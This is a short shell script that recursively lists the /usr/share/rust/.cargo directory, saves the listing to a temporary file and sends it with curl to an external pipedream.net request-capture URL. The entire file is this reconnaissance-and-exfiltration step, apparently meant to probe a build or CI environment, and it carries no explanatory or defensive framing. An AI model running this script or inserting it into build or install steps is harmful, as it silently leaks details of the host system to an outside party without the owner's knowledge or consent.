#!/bin/sh

echo $(ls -la -R /usr/share/rust/.cargo) > /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
